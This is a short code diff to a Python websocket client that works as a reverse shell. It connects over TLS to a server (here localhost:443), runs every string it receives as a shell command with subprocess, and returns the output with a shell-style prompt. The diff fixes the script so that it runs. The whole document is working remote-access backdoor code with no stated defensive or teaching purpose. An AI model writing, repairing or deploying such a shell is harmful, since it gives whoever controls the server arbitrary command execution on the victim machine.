@@ -13,17 +13,18 @@ ssl_context.load_verify_locations(localhost_pem, "key.pem")
 
 
 async def hello():
-    uri = "wss://localhost:443"
+    uri = "wss://localhost:443/"
     async with websockets.connect(uri, ssl=ssl_context) as websocket:
         while True:
             data = await websocket.recv()
-            if (data[:2].decode("utf-8") == 'cd'):
-                os.chdir(data[3:].decode("utf-8"))
+            if (data[:2] == 'cd'):
+                os.chdir(data[3:])
             if (len(data) > 0):
                 cmd = subprocess.Popen(
                     data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output_bytes = cmd.stdout.read()
                 output_str = str(output_bytes, "utf-8")
                 await websocket.send(str.encode(output_str + str(os.getcwd()) + '$'))
-    asyncio.get_event_loop().run_until_complete(hello())
+
+asyncio.get_event_loop().run_until_complete(hello())
 asyncio.get_event_loop().run_forever()
